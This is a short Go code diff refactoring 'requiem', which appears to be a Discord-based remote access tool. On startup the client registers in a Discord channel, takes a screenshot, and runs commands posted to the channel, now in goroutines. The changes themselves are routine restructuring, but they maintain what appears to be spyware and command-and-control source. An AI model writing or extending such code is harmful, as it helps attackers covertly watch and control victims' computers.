@@ -2,10 +2,12 @@ package bot
 
 import (
 	"fmt"
+	"strings"
+
 	"requiem/funcs"
 	"requiem/store"
 	"requiem/utils"
-	"strings"
+	"requiem/utils/discord"
 
 	"github.com/bwmarrin/discordgo"
 )
@@ -33,13 +35,13 @@ func Start() {
 
 	categoryID := store.CATEGORY_ID
 	if categoryID == "" {
-		categoryID = findCategory(bot)
+		categoryID = discord.FindCategory(bot)
 	}
 
-	channelID, new := findChannel(bot, categoryID)
+	channelID, new := discord.FindChannel(bot, categoryID)
 	targetChannel = channelID
 
-	message := getMessage(new)
+	message := discord.GetConnectionMsg(new)
 
 	buffer := funcs.TakeScreenshot()
 	if buffer != nil {
@@ -122,7 +124,7 @@ func handler(ses *discordgo.Session, msg *discordgo.MessageCreate) {
 
 	command, exists := commandsList[name]
 	if exists {
-		command.Exec(ses, msg, parts[1:])
+		go command.Exec(ses, msg, parts[1:])
 	} else {
 		ses.ChannelMessageSendReply(
 			msg.ChannelID,
